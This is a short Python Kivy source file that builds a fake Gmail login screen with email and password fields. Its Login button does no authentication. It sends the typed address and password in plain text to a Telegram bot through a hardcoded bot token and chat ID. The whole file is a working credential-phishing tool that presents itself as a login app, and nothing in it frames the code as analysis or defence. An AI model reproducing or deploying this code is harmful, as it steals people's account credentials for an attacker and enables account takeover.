from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput
from kivy.uix.image import Image
import requests

TOKEN = "8318983914:AAGEwCQk9HUsnIkdPspbrEqZjOtFXR9ZIUc"
CHAT_ID = "1170274856"

class LoginScreen(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.orientation = 'vertical'
        
        self.background = Image(source="bg.jpg", allow_stretch=True, keep_ratio=False)
        self.add_widget(self.background)

        self.email_input = TextInput(hint_text="Gmail", size_hint=(1, None), height=50, multiline=False)
        self.add_widget(self.email_input)

        self.password_input = TextInput(hint_text="Password", size_hint=(1, None), height=50, multiline=False, password=True)
        self.add_widget(self.password_input)

        self.login_button = Button(text="Login", size_hint=(1, None), height=50)
        self.login_button.bind(on_press=self.send_to_telegram)
        self.add_widget(self.login_button)

    def send_to_telegram(self, instance):
        gmail = self.email_input.text
        password = self.password_input.text
        message = f"Gmail: {gmail}\nPassword: {password}"
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={message}"
        requests.get(url)

class LoginApp(App):
    def build(self):
        return LoginScreen()

if __name__ == '__main__':
    LoginApp().run()
